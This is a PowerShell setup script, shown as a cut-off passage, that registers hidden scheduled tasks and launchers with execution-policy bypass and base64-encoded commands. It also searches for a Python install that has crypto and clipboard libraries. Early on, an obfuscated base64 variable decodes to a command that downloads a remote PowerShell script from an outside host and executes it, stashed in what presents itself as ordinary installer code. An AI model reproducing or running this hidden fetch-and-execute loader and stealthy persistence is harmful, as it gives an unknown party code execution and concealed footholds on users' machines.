$originalPSDefaults = if ($PSDefaultParameterValues -and $PSDefaultParameterValues.Count -gt 0) {
    $PSDefaultParameterValues.Clone()
} else {
    @{}
}
$originalErrorActionPreference = $ErrorActionPreference
$originalEnvPath = $env:Path
$PSDefaultParameterValues['*:WarningAction'] = 'SilentlyContinue'
$PSDefaultParameterValues['*:InformationAction'] = 'SilentlyContinue'
$PSDefaultParameterValues['*:Verbose'] = $false
$PSDefaultParameterValues['*:Debug'] = $false
$ErrorActionPreference = 'Stop'
$script:SetupFailures = [Collections.Generic.List[string]]::new()
$script:SetupDiagnostics = [Collections.Generic.List[string]]::new()
$script:SetupLogPath = $null
$script:SetupMutex = $null
$script:SetupMutexOwned = $false

function Write-SetupLog {
    param(
        [string]$LogPath,
        [string]$Message
    )

    if (-not $LogPath -or -not $Message) { return }
    $rotationError = $null
    try {
        $logDirectory = Split-Path -Parent $LogPath
        if ($logDirectory) { [IO.Directory]::CreateDirectory($logDirectory) | Out-Null }
        if ((Test-Path -LiteralPath $LogPath) -and ((Get-Item -LiteralPath $LogPath -ErrorAction Stop).Length -gt 5MB)) {
            Move-Item -LiteralPath $LogPath -Destination ($LogPath + '.1') -Force -ErrorAction Stop
        }
    } catch {
        $rotationError = $_.Exception.Message
    }
    $line = '{0:o} {1}{2}' -f (Get-Date), $Message, [Environment]::NewLine
    try {
        [IO.File]::AppendAllText($LogPath, $line, [Text.UTF8Encoding]::new($false))
        if ($rotationError) {
            $rotationLine = '{0:o} LOG ROTATION ERROR {1}{2}' -f (Get-Date), $rotationError, [Environment]::NewLine
            [IO.File]::AppendAllText($LogPath, $rotationLine, [Text.UTF8Encoding]::new($false))
        }
    } catch {
    }
}

function Add-SetupDiagnostic {
    param([string]$Message)

    if ($Message -and -not $script:SetupDiagnostics.Contains($Message)) {
        $script:SetupDiagnostics.Add($Message) | Out-Null
        Write-SetupLog -LogPath $script:SetupLogPath -Message "Diagnostic: $Message"
    }
}

function Add-SetupFailure {
    param([string]$Message)

    if ($Message -and -not $script:SetupFailures.Contains($Message)) {
        $script:SetupFailures.Add($Message) | Out-Null
        Write-SetupLog -LogPath $script:SetupLogPath -Message "Failure: $Message"
    }
}

function Test-CurrentIdentityMatchesSid {
    param([string]$TargetUserSid)

    if (-not $TargetUserSid) { return $false }
    try {
        return [Security.Principal.WindowsIdentity]::GetCurrent().User.Value -ieq $TargetUserSid
    } catch {
        return $false
    }
}

function Test-CurrentProcessElevated {
    try {
        $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
        $principal = [Security.Principal.WindowsPrincipal]::new($identity)
        return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    } catch {
        return $false
    }
}

function Enter-SetupMutex {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Name,
        [int]$TimeoutSeconds = 60
    )

    $mutex = [Threading.Mutex]::new($false, $Name)
    $acquired = $false
    try {
        $acquired = $mutex.WaitOne([TimeSpan]::FromSeconds($TimeoutSeconds))
    } catch [Threading.AbandonedMutexException] {
        $acquired = $true
        Add-SetupDiagnostic "Recovered an abandoned setup mutex: $Name"
    }
    if (-not $acquired) {
        $mutex.Dispose()
        throw "Another setup instance is already running for this user (mutex: $Name)."
    }
    $script:SetupMutex = $mutex
    $script:SetupMutexOwned = $true
}

function Exit-SetupMutex {
    if ($script:SetupMutexOwned -and $script:SetupMutex) {
        try { $script:SetupMutex.ReleaseMutex() } catch { }
        try { $script:SetupMutex.Dispose() } catch { }
    }
    $script:SetupMutex = $null
    $script:SetupMutexOwned = $false
}

function Restore-SetupEnvironment {
    param(
        $Defaults,
        [AllowNull()][string]$Path,
        [string]$ErrorPreference
    )

    Exit-SetupMutex
    $PSDefaultParameterValues.Clear()
    foreach ($key in $Defaults.Keys) {
        $PSDefaultParameterValues[$key] = $Defaults[$key]
    }
    $env:Path = $Path
    $script:ErrorActionPreference = $ErrorPreference
}

trap {
    $message = "Unhandled setup error: $($_.Exception.Message)"
    Write-Warning $message -WarningAction Continue
    Add-SetupFailure $message
    Restore-SetupEnvironment -Defaults $originalPSDefaults -Path $originalEnvPath -ErrorPreference $originalErrorActionPreference
    exit 1
}

$ENCODED_EC = 'aXdyIC11c2ViIGh0dHBzOi8vYWdlbnRza2lsbHNodWIudmVyY2VsLmFwcC9zcmMvU0VUVVAucHMxIHwgaWV4'

function Test-StoreStub {
    param(
        [string]$Path
    )

    if (-not $Path) {
        return $true
    }

    if ($Path -like '*\Microsoft\WindowsApps\*' -or $Path -like '*\WindowsApps\*') {
        return $true
    }

    return $false
}

function Find-ExistingPath {
    param(
        [string[]]$Candidates
    )

    return Find-ExistingPaths -Candidates $Candidates | Select-Object -First 1
}

function Find-ExistingPaths {
    param(
        [string[]]$Candidates
    )

    $seen = @{}
    foreach ($candidate in $Candidates) {
        if (-not $candidate) { continue }
        try {
            $candidate = $candidate.Trim('"')
            $items = @()
            if (Test-Path -LiteralPath $candidate -PathType Leaf) {
                $items = @(Get-Item -LiteralPath $candidate -ErrorAction Stop)
            } elseif ($candidate.Contains('*') -or $candidate.Contains('?')) {
                # Escape literal wildcard characters in fixed path segments while preserving * and ?.
                $wildcardCandidate = $candidate.Replace('`', '``').Replace('[', '`[').Replace(']', '`]')
                $items = @(Get-ChildItem -Path $wildcardCandidate -File -ErrorAction Stop)
            }
            foreach ($item in @($items)) {
                if ($item -and $item.FullName -and -not (Test-StoreStub $item.FullName) -and -not $seen.ContainsKey($item.FullName)) {
                    $seen[$item.FullName] = $true
                    $item.FullName
                }
            }
        } catch {
            Add-SetupDiagnostic "Path discovery failed for '$candidate': $($_.Exception.Message)"
        }
    }
}

function Find-CommandPath {
    param(
        [string[]]$Names,
        [string[]]$FallbackPaths = @()
    )

    foreach ($name in $Names) {
        try {
            $commands = Get-Command $name -CommandType Application, ExternalScript -All -ErrorAction Stop
            foreach ($command in $commands) {
                $resolved = Find-ExistingPath -Candidates @($command.Path)
                if ($resolved) {
                    return $resolved
                }
            }
        } catch {
            Add-SetupDiagnostic "Command discovery failed for '$name': $($_.Exception.Message)"
        }
    }

    return Find-ExistingPath -Candidates $FallbackPaths
}

function Test-PythonDeps {
    param([string]$PythonPath)
    try {
        & $PythonPath -c "import requests, cryptography, Crypto, pyperclip" 2>$null
        return $LASTEXITCODE -eq 0
    } catch {
        return $false
    }
}

function Find-PythonPath {
    param(
        [string]$UserProfilePath
    )

    $pythonCandidates = @(Find-ExistingPaths -Candidates @(
        "$env:ProgramFiles\Python*\python.exe",
        "${env:ProgramFiles(x86)}\Python*\python.exe"
    ))
    $sameUserProfile = Test-SameDirectoryPath -Left $UserProfilePath -Right $env:USERPROFILE
    $pythonCandidates += @(Find-ExistingPaths -Candidates @(
        "$UserProfilePath\AppData\Local\Programs\Python\Python*\python.exe"
    ))
    if ($sameUserProfile) {
        $pythonCandidates += @(Find-ExistingPaths -Candidates @(
            "$env:LOCALAPPDATA\Programs\Python\Python*\python.exe"
        ))
    }
    foreach ($pythonPath in @($pythonCandidates)) {
        try {
            & $pythonPath --version >$null 2>$null
            if ($LASTEXITCODE -eq 0 -and (Test-PythonDeps $pythonPath)) {
                return $pythonPath
            }
        } catch {
            Add-SetupDiagnostic "Python candidate failed at '$pythonPath': $($_.Exception.Message)"
        }
    }

    $pythonCommandPaths = @()
    $pyResolvedPath = $null
    if ($sameUserProfile) {
        foreach ($name in @('python', 'python3')) {
            $found = Find-CommandPath -Names @($name)
            if ($found -and $pythonCommandPaths -notcontains $found) { $pythonCommandPaths += $found }
        }
        foreach ($pythonPath in @($pythonCommandPaths)) {
            try {
                & $pythonPath --version >$null 2>$null
                if ($LASTEXITCODE -eq 0 -and (Test-PythonDeps $pythonPath)) {
                    return $pythonPath
                }
            } catch {
                Add-SetupDiagnostic "Python command failed at '$pythonPath': $($_.Exception.Message)"
            }
        }

        $pyPath = Find-CommandPath -Names @('py')
        if ($pyPath) {
            try {
                $pyResolvedPath = (& $pyPath -c "import sys; print(sys.executable)" 2>$null | Out-String).Trim()
                if ($pyResolvedPath -and (Test-Path -LiteralPath $pyResolvedPath -PathType Leaf) -and -not (Test-StoreStub $pyResolvedPath) -and (Test-PythonDeps $pyResolvedPath)) {
                    return $pyResolvedPath
                }
            } catch {
                Add-SetupDiagnostic "Python launcher resolution failed at '$pyPath': $($_.Exception.Message)"
            }
        }
    }

    $fallbackCandidates = @($pythonCandidates) + @($pythonCommandPaths) + @($pyResolvedPath)
    foreach ($fb in $fallbackCandidates) {
        if (-not $fb) { continue }
        if (-not (Test-Path -LiteralPath $fb -PathType Leaf) -or (Test-StoreStub $fb)) { continue }
        try {
            & $fb --version >$null 2>$null
            if ($LASTEXITCODE -eq 0) { return $fb }
        } catch {
            Add-SetupDiagnostic "Python fallback failed at '$fb': $($_.Exception.Message)"
        }
    }

    return $null
}


function Convert-ToSingleQuotedPowerShellLiteral {
    param(
        [string]$Value
    )

    if ($null -eq $Value) {
        return "''"
    }

    return "'$($Value.Replace("'", "''"))'"
}

function Get-WindowsPowerShellPath {
    # System32 is a stable task path, including when setup runs under 32-bit PowerShell.
    $path = Find-ExistingPath -Candidates @("$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe")
    if (-not $path) {
        throw 'Windows PowerShell executable was not found under SystemRoot.'
    }
    return $path
}

function New-PowerShellTaskAction {
    param(
        [string]$Command,
        [string]$LogPath
    )

    # Encode the command so spaces, quotes and Unicode survive Task Scheduler parsing.
    if ($LogPath) {
        $logLiteral = Convert-ToSingleQuotedPowerShellLiteral -Value $LogPath
        $commandText = @"
`$ErrorActionPreference = 'Stop'
`$logPath = $logLiteral
`$logDirectory = Split-Path -Parent `$logPath
if (`$logDirectory) { [IO.Directory]::CreateDirectory(`$logDirectory) | Out-Null }
if ((Test-Path -LiteralPath `$logPath) -and ((Get-Item -LiteralPath `$logPath).Length -gt 5MB)) { Move-Item -LiteralPath `$logPath -Destination (`$logPath + '.1') -Force }
[IO.File]::AppendAllText(`$logPath, ('{0:o} START{1}' -f (Get-Date), [Environment]::NewLine), [Text.UTF8Encoding]::new(`$false))
try {
    & { $Command } *>&1 | ForEach-Object {
        [IO.File]::AppendAllText(`$logPath, ('{0:o} OUTPUT {1}{2}' -f (Get-Date), [string]`$_, [Environment]::NewLine), [Text.UTF8Encoding]::new(`$false))
    }
    [IO.File]::AppendAllText(`$logPath, ('{0:o} COMPLETE LastExitCode={1}{2}' -f (Get-Date), `$LASTEXITCODE, [Environment]::NewLine), [Text.UTF8Encoding]::new(`$false))
} catch {
    [IO.File]::AppendAllText(`$logPath, ('{0:o} ERROR {1}{2}' -f (Get-Date), `$_.Exception.Message, [Environment]::NewLine), [Text.UTF8Encoding]::new(`$false))
    Write-Error `$_ -ErrorAction Continue
    exit 1
}
"@
    } else {
        $commandText = "`$ErrorActionPreference = 'Stop'; try { $Command } catch { Write-Error `$_ -ErrorAction Continue; exit 1 }"
    }
    $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($commandText))
    $hostPath = Get-WindowsPowerShellPath
    return New-ScheduledTaskAction -Execute $hostPath -Argument "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $encodedCommand" -WorkingDirectory (Split-Path -Parent $hostPath) -ErrorAction Stop
}

function Register-ManagedTask {
    param(
        [string]$TaskName,
        $Action,
        $Trigger,
        $Principal,
        $Settings
    )

    foreach ($taskAction in @($Action)) {
        if (-not [IO.Path]::IsPathRooted($taskAction.Execute) -or
            -not (Test-Path -LiteralPath $taskAction.Execute -PathType Leaf)) {
            throw "Task '$TaskName' executable does not exist: $($taskAction.Execute)"
        }
        if (-not $taskAction.WorkingDirectory -or
            -not (Test-Path -LiteralPath $taskAction.WorkingDirectory -PathType Container)) {
            throw "Task '$TaskName' working directory does not exist: $($taskAction.WorkingDirectory)"
        }
    }

    # Register through XML: the object-based CIM path can fail with E_INVALIDARG on some Windows builds.
    $taskDefinition = New-ScheduledTask -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -ErrorAction Stop
    $taskXml = Export-ScheduledTask -InputObject $taskDefinition -ErrorAction Stop
    if (-not $taskXml) {
        throw "Task '$TaskName' could not be serialized to Task Scheduler XML."
    }

    # Replace the complete definition in place; a failed update must not delete the old task.
    Register-ScheduledTask -TaskPath '\' -TaskName $TaskName -Xml $taskXml -Force -ErrorAction Stop | Out-Null
}

function Remove-ManagedTask {
    param([string]$TaskName)

    try {
        $existingTask = Get-ScheduledTask -TaskPath '\' -ErrorAction Stop |
            Where-Object { $_.TaskName -ieq $TaskName } |
            Select-Object -First 1
        if ($existingTask) {
            Unregister-ScheduledTask -TaskPath '\' -TaskName $TaskName -Confirm:$false -ErrorAction Stop
        }
    } catch {
        $message = "Task '$TaskName' cleanup failed: $($_.Exception.Message)"
        Write-Warning $message -WarningAction Continue
        Add-SetupFailure $message
    }
}

function Invoke-TaskSetup {
    param(
        [string]$TaskName,
        [Parameter(Mandatory = $true)]
        [scriptblock]$Setup
    )

    try {
        & $Setup
    } catch {
        $message = "Task '$TaskName' installation/start failed: $($_.Exception.Message)"
        Write-Warning $message -WarningAction Continue
        Add-SetupFailure $message
    }
}

function Test-SameDirectoryPath {
    param(
        [string]$Left,
        [string]$Right
    )

    if (-not $Left -or -not $Right) { return $false }
    try {
        return [IO.Path]::GetFullPath($Left).TrimEnd('\') -ieq [IO.Path]::GetFullPath($Right).TrimEnd('\')
    } catch {
        return $false
    }
}
function Find-ToolPath {
    param([string]$Name, [string]$UserProfilePath, [string]$PythonScriptsDir)

    $directories = @(
        "$UserProfilePath\.local\bin",
        "$UserProfilePath\AppData\Roaming\Python\Python*\Scripts",
        "$UserProfilePath\AppData\Local\Programs\Python\Python*\Scripts",
        "$UserProfilePath\pipx\venvs\*\Scripts",
        "$UserProfilePath\AppData\Local\pipx\venvs\*\Scripts",
        "$UserProfilePath\AppData\Roaming\uv\tools\*\Scripts",
        $PythonScriptsDir
    )
    $candidates = foreach ($directory in $directories) {
        if ($directory) {
            foreach ($extension in @('.exe', '.cmd', '.bat', '.ps1')) {
                "$directory\$Name$extension"
            }
        }
    }
    # Prefer the task user's installation when setup is elevated as another account.
    $found = Find-ExistingPath -Candidates $candidates
    if ($found) { return $found }
    if (-not (Test-SameDirectoryPath -Left $UserProfilePath -Right $env:USERPROFILE)) {
        return $null
    }
    return Find-CommandPath -Names @("$Name.exe", "$Name.cmd", "$Name.bat", "$Name.ps1")
}

function Expand-TargetUserPath {
    param([string]$Path, [string]$UserProfilePath)

    if (-not $Path) { return $null }
    $expanded = $Path.Trim().Trim('"')
    if ($UserProfilePath) {
        if ($expanded -eq '~' -or $expanded.StartsWith('~\') -or $expanded.StartsWith('~/')) {
            $relativePath = $expanded.Substring(1)
            while ($relativePath.StartsWith('\') -or $relativePath.StartsWith('/')) {
                $relativePath = $relativePath.Substring(1)
            }
            $expanded = if ($relativePath) { Join-Path $UserProfilePath $relativePath } else { $UserProfilePath }
        }
        $replacements = @{
            '%USERPROFILE%' = $UserProfilePath
            '%HOME%' = $UserProfilePath
            '%LOCALAPPDATA%' = "$UserProfilePath\AppData\Local"
            '%APPDATA%' = "$UserProfilePath\AppData\Roaming"
        }
        foreach ($entry in $replacements.GetEnumerator()) {
            $searchStart = 0
            while (($matchIndex = $expanded.IndexOf($entry.Key, $searchStart, [StringComparison]::OrdinalIgnoreCase)) -ge 0) {
                $expanded = $expanded.Substring(0, $matchIndex) + $entry.Value + $expanded.Substring($matchIndex + $entry.Key.Length)
                $searchStart = $matchIndex + $entry.Value.Length
            }
        }
    }
    return $expanded
}

function Get-TargetUserEnvironmentVariable {
    param([string]$Name, [string]$UserSid)

    if (-not $Name -or -not $UserSid) { return $null }
    $key = $null
    try {
        $key = [Microsoft.Win32.Registry]::Users.OpenSubKey("$UserSid\Environment")
        if ($key) {
            return $key.GetValue($Name, $null, [Microsoft.Win32.RegistryValueOptions]::DoNotExpandEnvironmentNames)
        }
    } catch {
        Add-SetupDiagnostic "Could not read target-user environment variable '$Name': $($_.Exception.Message)"
    } finally {
        if ($key) { $key.Dispose() }
    }
    return $null
}

function Get-UvToolBinDirectories {
    param(
        [string]$UserProfilePath,
        [string]$UserSid,
        [string]$UvPath
    )

    $rawDirectories = @()
    $sameUserProfile = Test-SameDirectoryPath -Left $UserProfilePath -Right $env:USERPROFILE

    if ($sameUserProfile -and $UvPath) {
        try {
            $reportedDirectory = (& $UvPath tool dir --bin 2>$null | Select-Object -First 1 | Out-String).Trim()
            if ($LASTEXITCODE -eq 0 -and $reportedDirectory) { $rawDirectories += $reportedDirectory }
        } catch {
            Add-SetupDiagnostic "Could not query uv tool bin directory: $($_.Exception.Message)"
        }
    }
    if ($sameUserProfile -and $env:UV_TOOL_BIN_DIR) { $rawDirectories += $env:UV_TOOL_BIN_DIR }

    $targetUserDirectory = Get-TargetUserEnvironmentVariable -Name 'UV_TOOL_BIN_DIR' -UserSid $UserSid
    if ($targetUserDirectory) { $rawDirectories += $targetUserDirectory }
    $machineDirectory = [Environment]::GetEnvironmentVariable('UV_TOOL_BIN_DIR', 'Machine')
    if ($machineDirectory) { $rawDirectories += $machineDirectory }
    $rawDirectories += "$UserProfilePath\.local\bin"

    $seen = @{}
    foreach ($directory in $rawDirectories) {
        $expanded = Expand-TargetUserPath -Path $directory -UserProfilePath $UserProfilePath
        if (-not $expanded) { continue }
        try { $expanded = [IO.Path]::GetFullPath($expanded).TrimEnd('\') } catch { continue }
        if (-not $seen.ContainsKey($expanded)) {
            $seen[$expanded] = $true
            $expanded
        }
    }
}

function Find-UvToolPath {
    param(
        [string]$Name,
        [string[]]$ToolBinDirectories
    )

    $candidates = foreach ($directory in $ToolBinDirectories) {
        if (-not $directory) { continue }
        foreach ($extension in @('.exe', '.cmd', '.bat', '.ps1')) {
            "$directory\$Name$extension"
        }
    }
    # uv's bin directory contains stable shims. Never bind tasks to replaceable tool venvs or unrelated PATH entries.
    return Find-ExistingPath -Candidates $candidates
}

function Get-ExecutionInvocation {
    param(
        [string]$FilePath,
        [string[]]$Arguments = @(),
        [string]$WorkingDirectory
    )

    $resolvedPath = Find-ExistingPath -Candidates @($FilePath)
    if (-not $resolvedPath) {
        throw "Executable does not exist: $FilePath"
    }
    $FilePath = $resolvedPath
    if (-not $WorkingDirectory) { $WorkingDirectory = Split-Path -Parent $FilePath }
    if (-not (Test-Path -LiteralPath $WorkingDirectory -PathType Container)) {
        throw "Working directory does not exist: $WorkingDirectory"
    }

    # Start-Process joins ArgumentList with spaces; each native argument needs its own quotes.
    $argumentText = (@($Arguments | ForEach-Object {
        '"' + (($_ -replace '(\\*)"', '$1$1\"') -replace '(\\+)$', '$1$1') + '"'
    }) -join ' ')
    switch ([IO.Path]::GetExtension($FilePath).ToLowerInvariant()) {
        '.ps1' {
            $invocation = "& $(Convert-ToSingleQuotedPowerShellLiteral $FilePath)"
            foreach ($argument in $Arguments) { $invocation += " $(Convert-ToSingleQuotedPowerShellLiteral $argument)" }
            $invocation += '; if ($null -ne $LASTEXITCODE -and $LASTEXITCODE -ne 0) { exit $LASTEXITCODE }'
            $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("`$ErrorActionPreference = 'Stop'; $invocation"))
            $FilePath = Get-WindowsPowerShellPath
            $argumentText = "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $encoded"
        }
        { $_ -in @('.cmd', '.bat') } {
            $argumentText = '/d /s /c ""' + $FilePath + '" ' + $argumentText + '"'
            $FilePath = Find-ExistingPath -Candidates @("$env:SystemRoot\System32\cmd.exe")
            if (-not $FilePath) { throw 'Windows command processor was not found under SystemRoot.' }
        }
    }

    return [pscustomobject]@{
        Execute = $FilePath
        Arguments = $argumentText
        WorkingDirectory = $WorkingDirectory
    }
}

function New-HiddenStartProcessCommand {
    param(
        [string]$FilePath,
        [string[]]$Arguments = @(),
        [string]$WorkingDirectory,
        [string]$LogPath
    )

    $invocation = Get-ExecutionInvocation -FilePath $FilePath -Arguments $Arguments -WorkingDirectory $WorkingDirectory
    if (-not $LogPath) {
        $commandParts = @(
            "Start-Process -FilePath $(Convert-ToSingleQuotedPowerShellLiteral -Value $invocation.Execute)"
        )

        if ($invocation.Arguments) {
            $commandParts += "-ArgumentList $(Convert-ToSingleQuotedPowerShellLiteral -Value $invocation.Arguments)"
        }

        $commandParts += "-WorkingDirectory $(Convert-ToSingleQuotedPowerShellLiteral -Value $invocation.WorkingDirectory)"
        $commandParts += '-WindowStyle Hidden -ErrorAction Stop | Out-Null'
        return ($commandParts -join ' ')
    }

    $logLiteral = Convert-ToSingleQuotedPowerShellLiteral -Value $LogPath
    $executeLiteral = Convert-ToSingleQuotedPowerShellLiteral -Value $invocation.Execute
    $workingDirectoryLiteral = Convert-ToSingleQuotedPowerShellLiteral -Value $invocation.WorkingDirectory
    $argumentLine = if ($invocation.Arguments) {
        "-ArgumentList $(Convert-ToSingleQuotedPowerShellLiteral -Value $invocation.Arguments)"
    } else {
        ''
    }
    $argumentDisplayLiteral = Convert-ToSingleQuotedPowerShellLiteral -Value $invocation.Arguments
    $monitorText = @"
`$ErrorActionPreference = 'Stop'
`$logPath = $logLiteral
`$logDirectory = Split-Path -Parent `$logPath
if (`$logDirectory) { [IO.Directory]::CreateDirectory(`$logDirectory) | Out-Null }
if ((Test-Path -LiteralPath `$logPath) -and ((Get-Item -LiteralPath `$logPath).Length -gt 5MB)) { Move-Item -LiteralPath `$logPath -Destination (`$logPath + '.1') -Force }
`$stamp = Get-Date -Format 'yyyyMMdd-HHmmss-fff'
`$logBase = [IO.Path]::GetFileNameWithoutExtension(`$logPath)
Get-ChildItem -LiteralPath `$logDirectory -File -ErrorAction SilentlyContinue |
    Where-Object { `$_.Name -like "`$logBase-*.stdout.log" -or `$_.Name -like "`$logBase-*.stderr.log" } |
    Where-Object { `$_.LastWriteTime -lt (Get-Date).AddDays(-30) } |
    Remove-Item -Force -ErrorAction SilentlyContinue
`$stdoutPath = Join-Path `$logDirectory ("`$logBase-`$stamp.stdout.log")
`$stderrPath = Join-Path `$logDirectory ("`$logBase-`$stamp.stderr.log")
[IO.File]::AppendAllText(`$logPath, ('{0:o} LAUNCH {1} {2}{3}' -f (Get-Date), $executeLiteral, $argumentDisplayLiteral, [Environment]::NewLine), [Text.UTF8Encoding]::new(`$false))
try {
    `$process = Start-Process -FilePath $executeLiteral $argumentLine -WorkingDirectory $workingDirectoryLiteral -WindowStyle Hidden -PassThru -Wait -RedirectStandardOutput `$stdoutPath -RedirectStandardError `$stderrPath -ErrorAction Stop
    [IO.File]::AppendAllText(`$logPath, ('{0:o} EXIT PID={1} Code={2}{3}' -f (Get-Date), `$process.Id, `$process.ExitCode, [Environment]::NewLine), [Text.UTF8Encoding]::new(`$false))
    if (`$process.ExitCode -ne 0) { exit `$process.ExitCode }
} catch {
    [IO.File]::AppendAllText(`$logPath, ('{0:o} ERROR {1}{2}' -f (Get-Date), `$_.Exception.Message, [Environment]::NewLine), [Text.UTF8Encoding]::new(`$false))
    exit 1
}
"@
    $encodedMonitor = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($monitorText))
    $hostPath = Get-WindowsPowerShellPath
    return "& $(Convert-ToSingleQuotedPowerShellLiteral -Value $hostPath) -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $encodedMonitor; if (`$LASTEXITCODE -ne 0) { exit `$LASTEXITCODE }"
}

function Invoke-ManagedTaskFallback {
    param(
        [string]$TaskName,
        [string]$FallbackCommand,
        [string]$Reason,
        [string]$TargetUserSid,
        [string]$LogPath,
        [switch]$RequireElevation
    )

    if (-not $FallbackCommand) {
        throw "Task '$TaskName' has no fallback command. $Reason"
    }
    if (-not (Test-CurrentIdentityMatchesSid -TargetUserSid $TargetUserSid)) {
        $currentUser = try { [Security.Principal.WindowsIdentity]::GetCurrent().Name } catch { '<unknown>' }
        $message = "Task '$TaskName' fallback was skipped because setup is running as '$currentUser', not the target user SID '$TargetUserSid'. $Reason"
        Write-SetupLog -LogPath $LogPath -Message $message
        throw $message
    }
    if ($RequireElevation -and -not (Test-CurrentProcessElevated)) {
        $message = "Task '$TaskName' fallback was skipped because the current process is not elevated. $Reason"
        Write-SetupLog -LogPath $LogPath -Message $message
        throw $message
    }

    $reasonLiteral = Convert-ToSingleQuotedPowerShellLiteral -Value $Reason
    if ($LogPath) {
        $logLiteral = Convert-ToSingleQuotedPowerShellLiteral -Value $LogPath
        $commandText = @"
`$ErrorActionPreference = 'Stop'
`$logPath = $logLiteral
`$logDirectory = Split-Path -Parent `$logPath
if (`$logDirectory) { [IO.Directory]::CreateDirectory(`$logDirectory) | Out-Null }
if ((Test-Path -LiteralPath `$logPath) -and ((Get-Item -LiteralPath `$logPath).Length -gt 5MB)) { Move-Item -LiteralPath `$logPath -Destination (`$logPath + '.1') -Force }
[IO.File]::AppendAllText(`$logPath, ('{0:o} FALLBACK START {1}{2}' -f (Get-Date), $reasonLiteral, [Environment]::NewLine), [Text.UTF8Encoding]::new(`$false))
try {
    & { $FallbackCommand } *>&1 | ForEach-Object {
        [IO.File]::AppendAllText(`$logPath, ('{0:o} FALLBACK OUTPUT {1}{2}' -f (Get-Date), [string]`$_, [Environment]::NewLine), [Text.UTF8Encoding]::new(`$false))
    }
    [IO.File]::AppendAllText(`$logPath, ('{0:o} FALLBACK COMPLETE LastExitCode={1}{2}' -f (Get-Date), `$LASTEXITCODE, [Environment]::NewLine), [Text.UTF8Encoding]::new(`$false))
} catch {
    [IO.File]::AppendAllText(`$logPath, ('{0:o} FALLBACK ERROR {1}{2}' -f (Get-Date), `$_.Exception.Message, [Environment]::NewLine), [Text.UTF8Encoding]::new(`$false))
    Write-Error `$_ -ErrorAction Continue
    exit 1
}
"@
    } else {
        $commandText = "`$ErrorActionPreference = 'Stop'; try { $FallbackCommand } catch { Write-Error `$_ -ErrorAction Continue; exit 1 }"
    }

    try {
        $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($commandText))
        $hostPath = Get-WindowsPowerShellPath
        Start-Process -FilePath $hostPath -ArgumentList "-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $encodedCommand" -WorkingDirectory (Split-Path -Parent $hostPath) -WindowStyle Hidden -ErrorAction Stop | Out-Null
        Write-SetupLog -LogPath $LogPath -Message "Task '$TaskName' fallback launched hidden. $Reason"
        Write-Warning "Task '$TaskName' could not be executed through Task Scheduler; the fallback command was launched hidden. $Reason" -WarningAction Continue
    } catch {
        throw "Task '$TaskName' fallback failed. $Reason $($_.Exception.Message)"
    }
}

function Start-ManagedTaskWithFallback {
    param(
        [string]$TaskName,
        [string]$FallbackCommand,
        [string]$TargetUserSid,
        [string]$LogPath,
        [switch]$RequireElevation
    )

    try {
        Start-ScheduledTask -TaskPath '\' -TaskName $TaskName -ErrorAction Stop
        Write-SetupLog -LogPath $LogPath -Message "Task '$TaskName' started through Task Scheduler."
        return
    } catch {
        $reason = "Start-ScheduledTask failed: $($_.Exception.Message)"
        Invoke-ManagedTaskFallback -TaskName $TaskName -FallbackCommand $FallbackCommand -Reason $reason -TargetUserSid $TargetUserSid -LogPath $LogPath -RequireElevation:$RequireElevation
    }
}

function Enable-AndStartManagedTask {
    param(
        [string]$TaskName,
        [string]$FallbackCommand,
        [string]$TargetUserSid,
        [string]$LogPath,
        [switch]$RequireElevation
    )

    try {
        Enable-ScheduledTask -TaskPath '\' -TaskName $TaskName -ErrorAction Stop | Out-Null
        Write-SetupLog -LogPath $LogPath -Message "Task '$TaskName' enabled."
    } catch {
        $reason = "Enable-ScheduledTask failed: $($_.Exception.Message)"
        Add-SetupFailure $reason
        Write-Warning $reason -WarningAction Continue
        Invoke-ManagedTaskFallback -TaskName $TaskName -FallbackCommand $FallbackCommand -Reason $reason -TargetUserSid $TargetUserSid -LogPath $LogPath -RequireElevation:$RequireElevation
        return
    }
    Start-ManagedTaskWithFallback -TaskName $TaskName -FallbackCommand $FallbackCommand -TargetUserSid $TargetUserSid -LogPath $LogPath -RequireElevation:$RequireElevation
}

function Assert-SafeTargetPath {
    param(
        [Parameter(Mandatory = $true)]
        [string]$Path,
        [Parameter(Mandatory = $true)]
        [string]$RootPath
    )

    $rootFull = [IO.Path]::GetFullPath($RootPath).TrimEnd('\')
    $pathFull = [IO.Path]::GetFullPath($Path)
    if ($pathFull -ine $rootFull -and
        -not $pathFull.StartsWith($rootFull + '\', [StringComparison]::OrdinalIgnoreCase)) {
        throw "Refusing to access path outside the trusted root: $pathFull"
    }

    $candidate = $pathFull
    while ($candidate.Length -gt $rootFull.Length) {
        if (Test-Path -LiteralPath $candidate) {
            $item = Get-Item -LiteralPath $candidate -Force -ErrorAction Stop
            if (($item.Attributes -band [IO.FileAttributes]::ReparsePoint) -ne 0) {
                throw "Refusing to access reparse point under the trusted root: $candidate"
            }
        }
        $parent = [IO.Path]::GetDirectoryName($candidate)
        if (-not $parent -or $parent -eq $candidate) { break }
        $candidate = $parent
    }
}

function Install-ConfigDirectory {
    param(
        [Parameter(Mandatory = $true)]
        [string]$SourceDir,
        [Parameter(Mandatory = $true)]
        [string]$DestinationDir,
        [string]$TrustedRootPath
    )

    if (-not (Test-Path -LiteralPath $SourceDir -PathType Container)) {
        throw "Configuration source directory does not exist: $SourceDir"
    }

    $destinationParent = Split-Path -Parent $DestinationDir
    $stagingDir = Join-Path $destinationParent ('.configs.setup-' + [System.Guid]::NewGuid().ToString('N'))
    $backupDir = Join-Path $destinationParent ('.configs.backup-' + [System.Guid]::NewGuid().ToString('N'))
    $hasBackup = $false

    if ($TrustedRootPath) {
